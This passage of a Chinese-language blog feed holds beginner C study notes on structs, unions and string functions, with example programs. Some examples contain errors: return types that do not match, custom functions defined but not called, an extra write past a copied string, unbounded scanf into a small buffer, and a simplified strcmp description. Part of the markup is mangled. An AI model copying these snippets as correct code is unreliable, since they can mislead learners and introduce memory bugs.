class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">struct date&#123;</span><br><span class="line">    int month;</span><br><span class="line">    int day;</span><br><span class="line">    int year;</span><br><span class="line">&#125;;</span><br><span class="line">int main()&#123;</span><br><span class="line">    struct date today;</span><br><span class="line">    today.month = 03;</span><br><span class="line">    today.day = 05;</span><br><span class="line">    today.year = 2020;</span><br><span class="line">    printf(&quot;%i-%i-%i&quot;,today.year,today.month,today.day);</span><br><span class="line">    //%i表示有符号十进制整数 </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>{cat_tips_E}声明结构的形式{&#x2F;cat_tips_E}</p><ul><li>形式一：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct point&#123;</span><br><span class="line">    int x;</span><br><span class="line">    int y;</span><br><span class="line">&#125;;</span><br><span class="line">struct point p1,p2;     // p1和p2都是point里面有x和y的值</span><br></pre></td></tr></table></figure><ul><li>形式二：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct&#123;</span><br><span class="line">    int x;</span><br><span class="line">    int y;</span><br><span class="line">&#125;p1,p2;// p1和p2都是一种无名结构，里面有x和y</span><br></pre></td></tr></table></figure><ul><li>形式三：(推荐)</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct point&#123;</span><br><span class="line">    int x;</span><br><span class="line">    int y;</span><br><span class="line">&#125;p1,p2;</span><br><span class="line">// p1和p2都是point里面有x和y的值</span><br></pre></td></tr></table></figure><p>{cat_tips_E}结构变量{&#x2F;cat_tips_E}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct date today;</span><br><span class="line">today.month = 03;</span><br><span class="line">today.day = 05;</span><br><span class="line">today.year = 2020;</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200423185249.png" alt="image-20200306092007788" title="image-20200306092007788"></p><p>{cat_tips_E}结构体的初始化{&#x2F;cat_tips_E}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">struct date today = &#123;03,05,2020&#125;;</span><br></pre></td></tr></table></figure><p>{cat_tips_E}结构成员{&#x2F;cat_tips_E}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">today.day</span><br></pre></td></tr></table></figure><p>{cat_tips_E}结构运算{&#x2F;cat_tips_E}</p><ul><li>赋值、取地址、传递函数参数</li><li>p1 &#x3D; (struct point){5,10}; &#x2F;&#x2F;相当于p1.x &#x3D; 5,p1.y &#x3D; 10;</li><li>p1 &#x3D; p2; &#x2F;&#x2F;相当于p1.x &#x3D; p2.x; p1.y &#x3D; p2.y;</li></ul><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200423185253.png" alt="image-20200306092110362" title="image-20200306092110362"></p><p>{cat_tips_E}结构可作为函数参数{&#x2F;cat_tips_E}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool isLeap(struct date d);</span><br></pre></td></tr></table></figure><p>{cat_tips_E}结构指针作为参数{&#x2F;cat_tips_E}</p><ul><li>指向结构的指针</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">struct date&#123;</span><br><span class="line">    int month;</span><br><span class="line">    int day;</span><br><span class="line">    int year;</span><br><span class="line">&#125;myday;</span><br><span class="line">struct date *p = &amp;myday;</span><br><span class="line">(*p).month = 12;</span><br><span class="line">p -&gt; month = 12;</span><br></pre></td></tr></table></figure><p><code>用-&gt;表示指针所指的结构变量中的成员</code></p><p>{cat_tips_E}结构数组{&#x2F;cat_tips_E}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">struct date dates[100];</span><br><span class="line">struct date dates[] = &#123;&#123;4,5,2005&#125;,&#123;2,4,2005&#125;&#125;;</span><br></pre></td></tr></table></figure><p>{cat_tips_E}结构中的结构{&#x2F;cat_tips_E}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct dateAndTime&#123;</span><br><span class="line">    struct date sdate;</span><br><span class="line">    struct time stime;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Example 01：</li></ul><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200423185259.png" alt="image-20200306092200846" title="image-20200306092200846"></p><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200423185303.png" alt="image-20200306092243437" title="image-20200306092243437"></p><p>{cat_tips_E}Typedef{&#x2F;cat_tips_E}</p><ul><li>typedef 自定义数据类型</li></ul><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200423185307.png" alt="image-20200306092323697" title="image-20200306092323697"></p><ul><li><pre><code>typedef struct&#123;    int month;    int day;    int year;&#125;Date;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20200305211317278](https://cos.gjcloak.xyz/CS-Notes/20200423185310.png &quot;image-20200305211317278&quot;)</span><br><span class="line"></span><br><span class="line">### 6.3 联合体</span><br><span class="line"></span><br></pre></td></tr></table></figure>union AnElt&#123;  int i;  char c;&#125;elt1,elt2;elt1.i = 4;elt2.c = &#39;a&#39;;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    </span><br><span class="line">*   sizeof(union ...) = // sizeof (每个成员) 的最大值</span><br><span class="line">    </span><br></pre></td></tr></table></figure>#include &lt;stdio.h&gt; typedef union&#123;  int i;  char ch[sizeof(int)];&#125;Data;int main()&#123;  Data data;  int i;  data.i = 1234;  for(i=0;i&lt;sizeof(int);i++)&#123;  //对于%02hhx，hhx已经以一个字节打印了，加上02限制，不够两位的补成两位。  printf(&quot;%02hhX&quot;,data.ch[i]);  &#125;  printf(&quot;\n&quot;);  return 0;</code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 结构类型 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习笔记第五章 字符串</title>
      <link href="/39.html"/>
      <url>/39.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>字符数组：char word[] &#x3D; {‘H’,’e’,’l’,’l’,’o’,’!’};</p><p>字符串：char word[] &#x3D; {‘H’,’e’,’l’,’l’,’o’,’!’,’\0’};</p></blockquote><ul><li>字符串以0结尾的一串字符，以数组的形式存在，以数组或指针的形式访问</li></ul><h3 id="5-1-字符串变量和常量"><a href="#5-1-字符串变量和常量" class="headerlink" title="5.1 字符串变量和常量"></a>5.1 字符串变量和常量</h3><ul><li>char * str &#x3D; “Hello”;</li><li>char word[] &#x3D; “Hello”;</li><li>char line[10] &#x3D; “Hello”;</li><li>Example 01：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char *s = &quot;Hello World\0&quot;;</span><br><span class="line">    char s1[] = &quot;Hello World\0&quot;;</span><br><span class="line">    s1[0] = &#x27;B&#x27;;</span><br><span class="line">    </span><br><span class="line">    printf(&quot;s=%s\n&quot;,s);</span><br><span class="line">    printf(&quot;s1=%s\n&quot;,s1);</span><br><span class="line">    printf(&quot;Here!s1[0]=%c\n&quot;,s1[0]); </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-2-字符串输入输出"><a href="#5-2-字符串输入输出" class="headerlink" title="5.2 字符串输入输出"></a>5.2 字符串输入输出</h3><ul><li>scanf 读入一个单词（到空格、tab或回车为止）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">char string[8];</span><br><span class="line">scanf(&quot;%s&quot;,string);</span><br><span class="line">printf(&quot;%s&quot;,string);</span><br></pre></td></tr></table></figure><h3 id="5-3-空字符串"><a href="#5-3-空字符串" class="headerlink" title="5.3 空字符串"></a>5.3 空字符串</h3><ul><li>char buffer[100] &#x3D; “”; &#x2F;&#x2F;这是一个空的字符串，buffer[0] &#x3D;&#x3D; ‘\0’；</li><li>char buffer[] &#x3D; “”; &#x2F;&#x2F;这个数组的长度只有1</li></ul><p>字符串数组</p><h3 id="5-4-字符串函数"><a href="#5-4-字符串函数" class="headerlink" title="5.4 字符串函数"></a>5.4 字符串函数</h3><p>putchar</p><ul><li>int putchar(int c);</li><li>向标准输出写一个字符</li><li>返回写了几个字符，EOF(-1)表示写失败</li></ul><p>getchar</p><ul><li>int getchar(void)</li><li>从标准输入读入一个字符</li><li>返回类型时int是为了返回EOF(-1)</li><li>windows—–ctrl+Z</li><li>linux———–ctrl+D</li></ul><h4 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h4><ul><li>Example 01：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int ch;</span><br><span class="line">    while((ch = getchar()) != EOF)&#123;</span><br><span class="line">        putchar(ch);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;EOF\n&quot;);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>在使用字符串处理函数时，应当在程序文件的开头用 #include &lt;string.h&gt; 把 ”string.h“ 文件包含到本文件中，<code>string.h</code> 标准库中包含函数：</p></blockquote><p>strlen</p><ul><li>测字符串长度的函数</li><li>size_t strlen(const char *s);</li><li>返回s的字符串长度（不包括结尾的0）</li><li>Example 01：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char line[] = &quot;Hello&quot;;</span><br><span class="line">    printf(&quot;strlen=%lu\n&quot;,strlen(line));</span><br><span class="line">    printf(&quot;sizeof=%lu\n&quot;,sizeof(line));</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Example 02：用mylen自定义函数，替代库中strlen</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int mylen(const char *s)&#123;</span><br><span class="line">    </span><br><span class="line">    int idx = 0;</span><br><span class="line">    while(s[idx]!=&#x27;\0&#x27;)&#123;</span><br><span class="line">        idx++;</span><br><span class="line">    &#125;</span><br><span class="line">    return idx;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char line[] = &quot;Hello&quot;;</span><br><span class="line">    printf(&quot;strlen=%lu\n&quot;,mylen(line));</span><br><span class="line">    printf(&quot;sizeof=%lu\n&quot;,sizeof(line));</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>strcmp</p><ul><li><p>字符串比较函数</p></li><li><p>int strcmp(const char <em>s1,const char</em> s2);</p></li><li><p>比较两个字符串，返回：</p><ul><li>0：s1 &#x3D;&#x3D; s2</li><li>1：s1 &gt; s2</li><li>-1：s1 &lt; s2</li></ul></li><li><p>Example 01：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char s1[] = &quot;abc&quot;;</span><br><span class="line">    char s2[] = &quot;abc&quot;;</span><br><span class="line">    printf(&quot;%d\n&quot;,strcmp(s1,s2));</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Example 02：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char s1[] = &quot;abc&quot;;</span><br><span class="line">    char s2[] = &quot;Abc&quot;;</span><br><span class="line">    printf(&quot;%d\n&quot;,strcmp(s1,s2));</span><br><span class="line">    printf(&quot;%d\n&quot;,&#x27;a&#x27;-&#x27;A&#x27;);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Example 03：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int mycmp(const char *s1,const char *s2)&#123;</span><br><span class="line">    int idx = 0;</span><br><span class="line">    while(s1[idx] == s2[idx] &amp;&amp; s1[idx] != &#x27;\0&#x27;)&#123;</span><br><span class="line">//        if(s1[idx] != s2[idx])&#123;</span><br><span class="line">//            break;</span><br><span class="line">//        &#125;else if(s1[idx] == &#x27;\0&#x27;)&#123;</span><br><span class="line">//            break;            </span><br><span class="line">//        &#125;</span><br><span class="line">        idx++;</span><br><span class="line">    &#125;</span><br><span class="line">    return s1[idx] - s2[idx];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char s1[] = &quot;abc&quot;;</span><br><span class="line">    char s2[] = &quot;Abc&quot;;</span><br><span class="line">    printf(&quot;%d\n&quot;,mycmp(s1,s2));</span><br><span class="line">    printf(&quot;%d\n&quot;,&#x27;a&#x27;-&#x27;A&#x27;);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Example 04：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int mycmp(const char *s1,const char *s2)&#123;</span><br><span class="line">        while(*s1 == *s2 &amp;&amp; *s1 != &#x27;\0&#x27;)&#123;</span><br><span class="line">        s1++;</span><br><span class="line">        s2++;</span><br><span class="line">    &#125;</span><br><span class="line">    return *s1 - *s2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char s1[] = &quot;abc&quot;;</span><br><span class="line">    char s2[] = &quot;Abc&quot;;</span><br><span class="line">    printf(&quot;%d\n&quot;,mycmp(s1,s2));</span><br><span class="line">    printf(&quot;%d\n&quot;,&#x27;a&#x27;-&#x27;A&#x27;);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>strcpy</p><ul><li>char <em>strcpy(char</em> restrict dst, const char *restrict src);</li><li>把src的字符串拷贝到dst</li><li>restrict表明src和dst不重叠（C99）</li><li>返回dst，为了能链起代码</li></ul><blockquote><p>复制一个字符串</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//动态申请内存</span><br><span class="line">char *dst = (char*)malloc(strlen(src)+1);</span><br><span class="line">//拷贝src到dst</span><br><span class="line">strcpy(dst,src);</span><br></pre></td></tr></table></figure><ul><li>Example 01：自定义版本—-数组</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int mycpy(char *dst,char *src)&#123;</span><br><span class="line">    int idx = 0;</span><br><span class="line">    while(src[idx])&#123;</span><br><span class="line">        dst[idx] = src[idx];</span><br><span class="line">        idx++;</span><br><span class="line">    &#125;</span><br><span class="line">    //dst[idx] = src[idx];</span><br><span class="line">    dst[idx] = &#x27;\0&#x27;;</span><br><span class="line">    return dst;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char s1[] = &quot;abc&quot;;</span><br><span class="line">    char s2[] = &quot;Abc&quot;;</span><br><span class="line">    printf(&quot;%s\n&quot;,strcpy(s1,s2));</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Example 02：自定义版本—-指针</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int mycpy(char *dst,char *src)&#123;</span><br><span class="line">    char *ret = dst;</span><br><span class="line">//    while(*src)&#123;</span><br><span class="line">////        *dst = *src;</span><br><span class="line">////        dst++;</span><br><span class="line">////        src++;</span><br><span class="line">//        *dst++ = *src++;    </span><br><span class="line">//    &#125;    </span><br><span class="line">    while(*dst++ = *src++)&#123;</span><br><span class="line">    &#125;    </span><br><span class="line">    *dst = &#x27;\0&#x27;;</span><br><span class="line">    return ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char s1[] = &quot;abc&quot;;</span><br><span class="line">    char s2[] = &quot;Abc&quot;;</span><br><span class="line">    printf(&quot;%s\n&quot;,strcpy(s1,s2));</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>strncpy</p><ul><li>将一个字符串2中前面n个字符复制字符串2中，但复制的字符个数不多于str1中原有的字符(不包括’\0’)</li><li>strncpy(str1,str2,2);</li><li>Example 01：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int mycpy(char *dst,char *src)&#123;</span><br><span class="line">    int idx = 0;</span><br><span class="line">    while(src[idx])&#123;</span><br><span class="line">        dst[idx] = src[idx];</span><br><span class="line">        idx++;</span><br><span class="line">    &#125;</span><br><span class="line">    //dst[idx] = src[idx];</span><br><span class="line">    dst[idx] = &#x27;\0&#x27;;</span><br><span class="line">    return dst;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char s1[] = &quot;abc&quot;;</span><br><span class="line">    char s2[] = &quot;ACd&quot;;</span><br><span class="line">    printf(&quot;%s\n&quot;,strncpy(s1,s2,2));</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>strcat</p><ul><li>字符串连接函数</li><li>char <em>strcat(char</em> restrict s1, const char *restrict s2);</li><li>把s2拷贝到s1的后面，接成一个长的字符串</li><li>返回s1</li><li>s1必须具有足够的空间</li><li>Example 01：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char str1[30] = &#123;&quot;I am &quot;&#125;;</span><br><span class="line">    char str2[] = &#123;&quot;a senior.&quot;&#125;;</span><br><span class="line">    puts(strcat(str1,str2));</span><br><span class="line">    return 0;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>注： 用 puts 和 gets 函数只能输出或输入一个字符串，不能写成 puts(str1,str2); gets(str1,str2);</p><p>strchr</p><ul><li>在字符串中找字符</li><li>char <em>strchr(const char</em> s,int c);</li><li>返回NULL表示没有找到</li><li>Example 01：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char s[] = &quot;hello&quot;;</span><br><span class="line">    char *p = strchr(s,&#x27;l&#x27;);</span><br><span class="line">    p = strchr(p+1,&#x27;l&#x27;);</span><br><span class="line">    printf(&quot;%s\n&quot;,p);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Example 02：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char s[] = &quot;hello&quot;;</span><br><span class="line">    char *p = strchr(s,&#x27;l&#x27;);</span><br><span class="line">    char *t = (char*)malloc(strlen(p)+1);</span><br><span class="line">    strcpy(t,p);</span><br><span class="line">    printf(&quot;%s\n&quot;,t);</span><br><span class="line">    free(t);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Example 03：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char s[] = &quot;hello&quot;;</span><br><span class="line">    char *p = strchr(s,&#x27;l&#x27;);</span><br><span class="line">    char c = *p;</span><br><span class="line">    *p = &#x27;\0&#x27;;</span><br><span class="line">    </span><br><span class="line">    char *t = (char*)malloc(strlen(s)+1);</span><br><span class="line">    strcpy(t,s);</span><br><span class="line">    printf(&quot;%s\n&quot;,t);</span><br><span class="line">    free(t);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>strrchr</p><ul><li>Example 01：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char s[] = &quot;hello&quot;;</span><br><span class="line">    char *p = strchr(s,&#x27;l&#x27;);</span><br><span class="line">    p = strrchr(p,&#x27;l&#x27;);</span><br><span class="line">    printf(&quot;%s\n&quot;,p);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>strstr</p><ul><li>字符串中找字符串</li><li>char <em>strstr(const char</em> s1, const char *s2);</li><li>char <em>strcasestr(const char</em> s1, const char *s2);</li></ul><p>strlwr</p><ul><li>将字符串中大写字母转换为小写字母函数</li><li>Example 01：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 